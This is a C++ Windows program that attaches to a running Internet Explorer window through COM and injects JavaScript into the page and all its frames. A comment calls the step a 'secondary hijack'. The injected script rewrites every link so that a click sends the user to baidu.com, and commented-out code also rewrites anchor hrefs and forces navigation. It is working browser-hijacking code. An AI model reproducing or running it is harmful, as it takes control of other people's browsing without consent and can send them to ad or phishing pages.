// Refer to: 
// http://blog.csdn.net/chenyujing1234/article/details/7668484
// http://www.cnblogs.com/qguohog/archive/2013/01/25/2876828.html

// GetIEHtml.cpp : 定义应用程序的入口点。
//

#include "stdafx.h"
#include "GetIEHtml.h"
#include <mshtml.h>
#include <atlbase.h>
#include <oleacc.h>
#include <ExDisp.h>

BOOL CALLBACK EnumChildProc(HWND hwnd,LPARAM lParam)
{
	TCHAR	buf[100];

	::GetClassName( hwnd, (LPTSTR)&buf, 100 );
	if ( _tcscmp( buf, _T("Internet Explorer_Server") ) == 0 )
	{
		*(HWND*)lParam = hwnd;
		return FALSE;
	}
	else
		return TRUE;
}

VARIANT StringToVariant(LPCTSTR str)
{
	VARIANT variant;
	VariantInit(&variant);
	variant.vt = VT_BSTR;
	variant.bstrVal = SysAllocString(str);
	
	return variant;
}

//HRESULT GetSelectionByOleContainer( CString& selText, CRect& selRect )
//{
//	// Get the IDispatch of the main document
//	CComPtr<IDispatch> pDisp;
//	m_pBrowser->get_Document( &pDisp );
//	if( pDisp == NULL )
//		return E_FAIL;
//
//
//
//	// Get the container
//	CComQIPtr<IOleContainer> pContainer = pDisp;
//	if( pContainer == NULL )
//		return E_FAIL;
//
//
//
//	// Get an enumerator for the frames
//	CComPtr<IEnumUnknown> pEnumerator;
//	HRESULT hr = pContainer->EnumObjects( OLECONTF_EMBEDDINGS, &pEnumerator );
//	if( FAILED(hr) )
//		return E_FAIL;
//
//
//
//	// Enumerate and refresh all the frames
//	CComPtr<IUnknown> pUnk;
//	ULONG uFetched = 0;
//	for( UINT i = 0; S_OK == pEnumerator->Next(1, &pUnk, &uFetched); i++ )
//	{
//		CComQIPtr<IWebBrowser2> pSubBrowser = pUnk;
//		pUnk.Release();
//
//		if( pSubBrowser == NULL )
//			continue;
//
//
//
//		// get sub document in frame
//		CComQIPtr<IHTMLDocument2> pSubDoc;
//		pDisp.Release();
//		pSubBrowser->get_Document( &pSubDoc );
//		if( pDisp )
//			pSubDoc = pDisp;
//		if( pSubDoc == NULL )
//			continue;
//
//
//
//		// get selection info
//		hr = GetSelectionFromSingleFrame(pSubDoc, selText, selRect );
//
//		if( SUCCEEDED( hr ) )
//			return hr;
//	}
//
//
//
//	// 全部遍历之后仍然没有结果
//	return E_FAIL;
//}

void ExecJs(CComPtr<IHTMLDocument2> spDoc2, CComBSTR innerCode)
{
	CComPtr<IHTMLWindow2> spWnd2;
	HRESULT hr = spDoc2->get_parentWindow(&spWnd2);
	if (hr != S_OK) {
		return;
	}

	CComBSTR bstrlan = SysAllocString(L"javascript");
	VARIANT v;
	VariantInit(&v);
	v.vt=VT_EMPTY;
	hr = spWnd2->execScript(innerCode, bstrlan, &v);
	VariantClear(&v);

	return;
}

void EnumFrame(CComPtr<IHTMLDocument2> spDoc2, CComBSTR innerCode)
{
	CComPtr<IHTMLFramesCollection2> pFrames;
	HRESULT hr = spDoc2->get_frames(&pFrames);
	if (hr != S_OK) {
		return;
	}

	long count;
	hr = pFrames->get_length(&count);
	if ((hr != S_OK) || (count == 0)) {
		return;
	}

	VARIANT varIndex;
	V_VT(&varIndex) = VT_I4;  
	
	for (int i = 0; i < count; i++) {
		V_I4(&varIndex) = i;
		VARIANT varResult;
		if (pFrames->item(&varIndex, &varResult) == S_OK) {
			CComPtr<IDispatch> pDispatch;
			pDispatch = varResult.pdispVal;			// 得到了 frame的Dispatch

			CComQIPtr<IHTMLWindow2> spWnd2(pDispatch);

			if (!spWnd2) {
				continue;
			}
			CComPtr<IHTMLDocument2> pSubDoc2;
			hr = spWnd2->get_document(&pSubDoc2);
			if (hr == S_OK) {
				ExecJs(pSubDoc2, innerCode);
				EnumFrame(pSubDoc2, innerCode);
				continue;
			}

			CComQIPtr<IServiceProvider>  spServiceProvider(spWnd2);
			if (!spServiceProvider) {
				continue;
			}

			CComPtr<IWebBrowser2> spWebBrws;
			hr = spServiceProvider->QueryService(IID_IWebBrowserApp, IID_IWebBrowser2, (void**)&spWebBrws);
			if (hr != S_OK) {
				continue;
			}

			CComPtr<IDispatch> spDisp;
			hr = spWebBrws->get_Document(&spDisp);
			pSubDoc2 = spDisp;
			ExecJs(pSubDoc2, innerCode);
			EnumFrame(pSubDoc2, innerCode);
		} 
	}

	return;
}

//You can store the interface pointer in a member variable 
//for easier access
void OnGetDocInterface(HWND hWnd) 
{
	CoInitialize( NULL );

	// Explicitly load MSAA so we know if it's installed
	HINSTANCE hInst = ::LoadLibrary( _T("OLEACC.DLL") );
	if (hInst == NULL) {
		MessageBox(NULL, TEXT("加载OLEACC.DLL失败"), NULL, MB_OK);
		return;
	}

	HWND hWndChild = NULL;
	// Get 1st document window
	::EnumChildWindows( hWnd, EnumChildProc, (LPARAM)&hWndChild );
	if (hWndChild == NULL) {
		MessageBox(NULL, TEXT("Internet Explorer_Server 没找到"), NULL, MB_OK);
		return;
	}

	
	LRESULT lRes;
			
	UINT nMsg = ::RegisterWindowMessage(_T("WM_HTML_GETOBJECT"));
	::SendMessageTimeout(hWndChild, nMsg, 0L, 0L, SMTO_ABORTIFHUNG, 1000, (DWORD*)&lRes);

	LPFNOBJECTFROMLRESULT pfObjectFromLresult = (LPFNOBJECTFROMLRESULT)::GetProcAddress(hInst, "ObjectFromLresult");
	if (pfObjectFromLresult) {
		HRESULT hr;
		CComPtr<IHTMLDocument2> spDoc2;
		hr = pfObjectFromLresult(lRes, IID_IHTMLDocument2, 0, (void**)&spDoc2);
		if (FAILED(hr)) {
			MessageBox(NULL, TEXT("IID_IHTMLDocument接口没找到"), NULL, MB_OK);
			return;
		}

		CComBSTR      bstrtitle;  
		spDoc2->get_title(&bstrtitle);		//取得文档标题
		MessageBox(NULL, bstrtitle, TEXT("Title"), MB_OK);
		spDoc2->get_URL(&bstrtitle);
		MessageBox(NULL, bstrtitle, TEXT("Url"), MB_OK);

		/*CComPtr<IHTMLElement> pBody;
		hr = spDoc2->get_body(&pBody);
		pBody->get_outerHTML(&bstrtitle);*/

		// 获取网页元素
		//CComPtr<IHTMLElementCollection> pColl;
		//hr = spDoc2->get_all(&pColl);
		//long len = 0;
		//hr = pColl->get_length(&len);
		//if (hr == S_OK) {
		//	for (int i = 0; i < len; i++) {
		//		CComVariant varName(i);
		//		varName.ChangeType(VT_UINT);
		//		CComVariant varIndex;
		//		CComPtr<IDispatch>pDisp;
		//		hr = pColl->item(varName, varIndex, &pDisp);
		//		if (SUCCEEDED(hr)) {
		//			CComQIPtr<IHTMLAnchorElement, &IID_IHTMLAnchorElement> pElement(pDisp);
		//			int c = 0;
		//			if (pElement.p != NULL) {
		//				CComBSTR bstrHref = SysAllocString(L"http://xxxxxxx");
		//				//hr = pElement->get_href(&bstrHref);
		//				hr = pElement->put_href(bstrHref);
		//			}
		//		}
		//	}
		//}

		//CComPtr<IDispatch> pDisp;
		//VARIANT index;
		//V_VT(&index) = VT_I4;  
		//V_I4(&index) = 0;  

		//VARIANT varID;
		//varID = StringToVariant(_T("edt"));			//控件的ID
		//hr = pColl->item(varID, index, &pDisp);		// 获取指定ID控件的位置
		//if (hr == S_OK) {
		//	CComQIPtr<IHTMLElement> pElem = pDisp;
		//	CComBSTR str = SysAllocString(L"javascript");
		//	hr = pElem->put_innerText(str);
		//}

		// 修改Url
		CComPtr<IWebBrowser2> pWebBrowser2;
		CComPtr<IHTMLWindow2> spWnd2;
		CComPtr<IServiceProvider>spServiceProv;
		hr=spDoc2->get_parentWindow((IHTMLWindow2**)&spWnd2);   
		if(SUCCEEDED(hr)) {
			/*hr=spWnd2->QueryInterface(IID_IServiceProvider,(void**)&spServiceProv);
			if(SUCCEEDED(hr)) {
			hr = spServiceProv->QueryService(IID_IWebBrowserApp,IID_IWebBrowser2,(void**)&pWebBrowser2);
			if(SUCCEEDED(hr)) {
			BSTR strSearch = SysAllocString(_T("www.baidu.com"));
			VARIANT vEmpty;
			VariantInit(&vEmpty);
			pWebBrowser2->Stop();
			pWebBrowser2->Navigate(strSearch, &vEmpty, &vEmpty, &vEmpty, &vEmpty);
			SysFreeString(strSearch);
			}
			}*/
			// 修改页面
			CComBSTR innerCode;
			// 二次劫持
			innerCode.Append(TEXT("(function () {"));
			innerCode.Append(TEXT("function cq_a_click() {"));
			innerCode.Append(TEXT("var aspan = document.getElementsByTagName(\"a\");"));
			innerCode.Append(TEXT("var cq_i = 0;"));
			innerCode.Append(TEXT("for (cq_i = 0; cq_i < aspan.length; cq_i++) {"));
			innerCode.Append(TEXT("aspan[cq_i].onclick = function () {"));
			innerCode.Append(TEXT("this.href = \"http://www.baidu.com\";"));
			innerCode.Append(TEXT("};}} cq_a_click(); })();"));

			CComBSTR bstrlan = SysAllocString(L"javascript");
			VARIANT v;
			VariantInit(&v);
			v.vt=VT_EMPTY;
			spWnd2->execScript(innerCode, bstrlan, &v);
			VariantClear(&v);
			EnumFrame(spDoc2, innerCode);
		}
	}

	::FreeLibrary(hInst);
	CoUninitialize();
}

int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	HWND hWnd = FindWindow(TEXT("IEFrame"), NULL);
	OnGetDocInterface(hWnd);

	return 0;
}
